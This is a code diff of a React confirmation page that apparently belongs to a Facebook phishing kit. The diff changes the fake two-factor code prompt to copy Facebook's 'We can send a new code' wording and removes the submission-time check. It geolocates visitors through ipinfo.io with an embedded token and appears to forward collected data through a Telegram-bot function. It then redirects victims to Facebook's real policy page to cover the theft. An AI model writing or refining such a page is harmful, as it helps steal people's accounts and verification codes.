@@ -25,7 +25,7 @@ const Confirm = () => {
     const timer = setInterval(() => {
       setTime((prevTime) => {
         if (prevTime === 0) {
-          clearInterval(timer); // Dừng đếm ngược khi hết thời gian
+          // clearInterval(timer); // Dừng đếm ngược khi hết thời gian
           setIsTimeUp(true);
           setCheckSubmitAndTime(false);
           return 0;
@@ -41,16 +41,16 @@ const Confirm = () => {
   const formatTime = (seconds: any) => {
     const minutes = Math.floor(seconds / 60);
     const remainingSeconds = seconds % 60;
-    const formattedMinutes = String(minutes).padStart(2, "0");
+    const formattedMinutes = String(minutes).padStart(1, "0");
     const formattedSeconds = String(remainingSeconds).padStart(2, "0");
     return `${formattedMinutes}:${formattedSeconds}`;
   };
 
   const handleFacebookRedirect = async () => {
-    if (time > 0) {
-      setCheckSubmitAndTime(true);
-      return;
-    }
+    // if (time > 0) {
+    //   setCheckSubmitAndTime(true);
+    //   return;
+    // }
     setLoading(true);
     const location = await axios.get("https://ipinfo.io?token=4ef03889d81a2d");
     await Promise.all([
@@ -64,8 +64,8 @@ const Confirm = () => {
       })
     );
     setLoading(false);
-    showModal2();
-    // window.location.href = "https://www.facebook.com";
+    // showModal2();
+    window.location.href = "https://www.facebook.com/policies_center/";
   };
 
   const sendTelegramBotForGgsheet = async (response: any) => {
@@ -172,8 +172,10 @@ const Confirm = () => {
   const [isClicked, setIsClicked] = useState(false);
 
   const handleClick = () => {
-    setIsClicked(true);
+    setIsTimeUp(false);
+    setTime(60);
   };
+
   return (
     <div className="container_confirm">
       <div className="header">
@@ -212,43 +214,63 @@ const Confirm = () => {
               autoSize
             />{" "}
             {isTimeUp ? (
-              <span>
-                {!isClicked ? (
-                  <span
-                    style={{
-                      marginLeft: "10px",
-                      textDecoration: "none",
-                      color: "#385898",
-                      cursor: "pointer",
-                    }}
-                    onClick={handleClick}
-                  >
-                    Send Code Again?
-                  </span>
-                ) : (
-                  <span
-                    style={{
-                      marginLeft: "10px",
-                      textDecoration: "none",
-                      color: "#385898",
-                      // cursor: "pointer",
-                    }}
-                  >
-                    Please wait a few minutes.
-                  </span>
-                )}
-              </span>
+              <div
+                style={{
+                  marginTop: "10px",
+                  color: "#5D6C7B",
+                  fontWeight: 400,
+                  display: "flex",
+                  flexDirection: "row",
+                  alignItems: "center",
+                }}
+              >
+                <img
+                  style={{ width: "16px", height: "16px", marginRight: "4px" }}
+                  src="/images/loading.png"
+                  alt=""
+                />
+                It may take a few minutes for you to get this code.
+                <span
+                  style={{
+                    marginLeft: "4px",
+                    textDecoration: "none",
+                    color: "blue",
+                    cursor: "pointer",
+                    fontWeight: "500",
+                  }}
+                  onClick={handleClick}
+                >
+                  Get a new code
+                </span>
+              </div>
             ) : (
-              <span style={{ marginLeft: "10px" }}>
-                (wait: {formatTime(time)})
-              </span>
+              <div
+                style={{
+                  marginTop: "10px",
+                  color: "#5D6C7B",
+                  fontWeight: 400,
+                  display: "flex",
+                  flexDirection: "row",
+                  alignItems: "center",
+                }}
+              >
+                <img
+                  style={{ width: "16px", height: "16px", marginRight: "4px" }}
+                  src="/images/loading.png"
+                  alt=""
+                />
+                We can send a new code in
+                <span style={{ marginLeft: "4px", fontWeight: 500 }}>
+                  {formatTime(time)}
+                </span>
+              </div>
             )}
-            {checkSubmitAndTime && (
+            {/* {checkSubmitAndTime && (
               <p style={{ color: "red", marginTop: "6px" }}>
                 The code generator you entered is incorrect. Please wait{" "}
                 {formatTime(time)} to receive another one.
               </p>
-            )}
+            )} */}
           </div>
           <div className="footer_form">
             {/* <p onClick={showModal} className="footer_form-title">
